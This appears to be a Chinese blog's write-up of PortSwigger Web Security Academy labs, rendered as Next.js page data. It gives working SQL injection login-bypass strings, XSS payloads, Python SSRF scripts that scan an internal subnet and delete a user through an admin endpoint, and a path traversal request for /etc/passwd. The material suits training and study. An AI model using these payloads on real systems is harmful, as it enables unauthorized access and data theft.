2:I[10579,["2202","static/chunks/2202-c94dd0688c9a9cf1.js","7197","static/chunks/7197-fbfe003e0dc31b13.js","2133","static/chunks/app/(posts)/longtime/wp-portswigger/page-f1d78eab754bccbe.js"],""]
3:I[62029,["2202","static/chunks/2202-c94dd0688c9a9cf1.js","7197","static/chunks/7197-fbfe003e0dc31b13.js","2133","static/chunks/app/(posts)/longtime/wp-portswigger/page-f1d78eab754bccbe.js"],""]
8:I[5613,[],""]
9:I[31778,[],""]
a:I[30389,["2202","static/chunks/2202-c94dd0688c9a9cf1.js","5250","static/chunks/5250-9192d080d30d8ff7.js","7197","static/chunks/7197-fbfe003e0dc31b13.js","1993","static/chunks/app/(posts)/layout-64a2d12ca4e5a8ea.js"],""]
b:I[25694,["5250","static/chunks/5250-9192d080d30d8ff7.js","3185","static/chunks/app/layout-3bcdb418b19b279c.js"],"GlobalProvider"]
c:I[30397,["5250","static/chunks/5250-9192d080d30d8ff7.js","3185","static/chunks/app/layout-3bcdb418b19b279c.js"],""]
4:T6f1,<span class="token keyword">function</span> <span class="token function">trackSearch</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="/resources/images/tracker.gif?searchTerms='</span><span class="token operator">+</span>query<span class="token operator">+</span><span class="token string">'">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">trackSearch</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
5:T6bc,<span class="token keyword">function</span> <span class="token function">doSearchQuery</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchMessage'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> query<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">doSearchQuery</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
6:T558,<span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#backLink'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'returnPath'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
7:T5bc,<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://0aee006003dd23eb8589365a00810071.web-security-academy.net/product/stock"</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    stockApi <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://192.168.0.</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">:8080/admin"</span></span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"stockApi"</span><span class="token punctuation">:</span> stockApi<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
0:["mOSxNIhZz6aihDpxyXnIa",[[["",{"children":["(posts)",{"children":["longtime",{"children":["wp-portswigger",{"children":["__PAGE__",{}]}]}]}]},"$undefined","$undefined",true],["",{"children":["(posts)",{"children":["longtime",{"children":["wp-portswigger",{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],["$","h1",null,{"className":"x-title","children":"PortSwigger Writeup"}],["$","h2",null,{"className":"x-h1","children":"SQL injection"}],["$","h3",null,{"className":"x-h2","children":"Ap: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"给了查询的SQL语句示例："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$L3",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM products WHERE category = 'Gifts' AND released = 1"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> products <span class=\"token keyword\">WHERE</span> category <span class=\"token operator\">=</span> <span class=\"token string\">'Gifts'</span> <span class=\"token operator\">AND</span> released <span class=\"token operator\">=</span> <span class=\"token number\">1</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"构造<code class=\"x-inline-highlight\">payload</code>为<code class=\"x-inline-highlight\">Gifts' or 1=1 --</code>，输入URL<code class=\"x-inline-highlight\">/filter?category=Gifts%27%20or%201=1%20--</code>。"}}],["$","h3",null,{"className":"x-h2","children":"Ap: SQL injection vulnerability allowing login bypass"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"直接用用户名<code class=\"x-inline-highlight\">administrator' --</code>；或用户名<code class=\"x-inline-highlight\">administrator</code>，密码<code class=\"x-inline-highlight\">1' or 1=1 --</code>。"}}],["$","h2",null,{"className":"x-h1","children":"XSS: Cross-site scripting"}],["$","h3",null,{"className":"x-h2","children":"笔记"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">document.write</code>和<code class=\"x-inline-highlight\">innerHTML</code>：<code class=\"x-inline-highlight\">innerHTML</code>写入的<code class=\"x-inline-highlight\">script</code>标签不会被解析执行；<code class=\"x-inline-highlight\">document.write</code>会直接将内容插入文档流，写入的<code class=\"x-inline-highlight\">script</code>标签会被执行。对于<code class=\"x-inline-highlight\">innerHTML</code>的情况可以考虑使用<code class=\"x-inline-highlight\">&#60;img src=0 onerror=\"alert(0)\"&#62;</code>。"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Ap: Reflected XSS into HTML context with nothing encoded"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"反射型XSS，搜索<code class=\"x-inline-highlight\">&#60;script&#62;alert(0)&#60;/script&#62;</code>。"}}],["$","h3",null,{"className":"x-h2","children":"Ap: Stored XSS into HTML context with nothing encoded"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"存储型XSS，评论<code class=\"x-inline-highlight\">&#60;script&#62;alert(0)&#60;/script&#62;</code>。"}}],["$","h3",null,{"className":"x-h2","children":"Ap: DOM XSS in document.write sink using source location.search"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"页面中有如下代码："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$L3",null,{"className":"x-codeblock-header-copy","text":"function trackSearch(query) {\n    document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+query+'\">');\n}\nvar query = (new URLSearchParams(window.location.search)).get('search');\nif(query) {\n    trackSearch(query);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$4"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"构造<code class=\"x-inline-highlight\">payload</code>为<code class=\"x-inline-highlight\">\"&#62;&#60;script&#62;alert(0)&#60;/script&#62;</code>，输入搜索即可。"}}],["$","h3",null,{"className":"x-h2","children":"Ap: DOM XSS in innerHTML sink using source location.search"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"页面中有如下代码："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$L3",null,{"className":"x-codeblock-header-copy","text":"function doSearchQuery(query) {\n    document.getElementById('searchMessage').innerHTML = query;\n}\nvar query = (new URLSearchParams(window.location.search)).get('search');\nif(query) {\n    doSearchQuery(query);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$5"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"构造<code class=\"x-inline-highlight\">payload</code>为<code class=\"x-inline-highlight\">&#60;img src=0 onerror=\"alert(0)\"&#62;</code>，输入搜索即可。"}}],["$","h3",null,{"className":"x-h2","children":"Ap: DOM XSS in jQuery anchor href attribute sink using location.search source"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">/feedback</code>页面中有如下代码："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$L3",null,{"className":"x-codeblock-header-copy","text":"$$(function() {\n    $('#backLink').attr(\"href\", (new URLSearchParams(window.location.search)).get('returnPath'));\n});\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$6"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"注入点是<code class=\"x-inline-highlight\">a</code>标签的<code class=\"x-inline-highlight\">href</code>，<code class=\"x-inline-highlight\">payload</code>为<code class=\"x-inline-highlight\">javascript:alert(0)</code>。输入URL<code class=\"x-inline-highlight\">/feedback?returnPath=javascript:alert(0)</code>，然后点击这个<code class=\"x-inline-highlight\">a</code>标签。"}}],["$","h2",null,{"className":"x-h1","children":"SSRF: Server-side request forgery"}],["$","h3",null,{"className":"x-h2","children":"Ap: Basic SSRF against the local server"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"根据提示，发送请求："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$L3",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"https://0aaf00c7049bf8f4805d26ba00c90059.web-security-academy.net/product/stock\"\nstockApi = \"http://localhost/admin\"\nresp = requests.post(url, data={\"stockApi\": stockApi})\nprint(resp.text)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"https://0aaf00c7049bf8f4805d26ba00c90059.web-security-academy.net/product/stock\"</span>\nstockApi <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/admin\"</span>\nresp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"stockApi\"</span><span class=\"token punctuation\">:</span> stockApi<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在返回中看到<code class=\"x-inline-highlight\">&#60;a href=\"/admin/delete?username=carlos\"&#62;Delete&#60;/a&#62;</code>，再次发送对<code class=\"x-inline-highlight\">/admin/delete?username=carlos</code>的请求即可。"}}],["$","h3",null,{"className":"x-h2","children":"Ap: Basic SSRF against another back-end system"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"根据提示扫描端口："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$L3",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"https://0aee006003dd23eb8589365a00810071.web-security-academy.net/product/stock\"\nfor x in range(255):\n    stockApi = f\"http://192.168.0.{x}:8080/admin\"\n    resp = requests.post(url, data={\"stockApi\": stockApi})\n    print(x, resp.status_code)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$7"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">192.168.0.13:8080/admin</code>返回<code class=\"x-inline-highlight\">200</code>。删除用户同上。"}}],["$","h2",null,{"className":"x-h1","children":"Path traversal"}],["$","h3",null,{"className":"x-h2","children":"Ap: File path traversal, simple case"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"随便检查一个图片，地址为<code class=\"x-inline-highlight\">/image?filename=23.jpg</code>，改为<code class=\"x-inline-highlight\">/txt?filename=../../../etc/passwd</code>即可。"}}]],null]]},["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children","longtime","children","wp-portswigger","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/55722f4e6a890f7d.css","precedence":"next","crossOrigin":""}]]}]]},["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children","longtime","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}]]},[null,["$","div",null,{"id":"post-layout","children":[false,["$","div",null,{"id":"main","className":"y-center-wrapper","children":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}]}],["$","$La",null,{}]]}],null]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$Lb",null,{"children":[["$","$Lc",null,{}],["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","div",null,{"id":"notfound-404","children":"404"}],["$","div",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/0f7cce8b0dae9908.css","precedence":"next","crossOrigin":""}]],"styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/421d0808425e209e.css","precedence":"next","crossOrigin":""}]]}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/dac94f68c1ae2954.css","precedence":"next","crossOrigin":""}]],"$Ld"]]]]
d:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"PortSwigger Writeup - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/longtime/wp-portswigger/"}]]
1:null
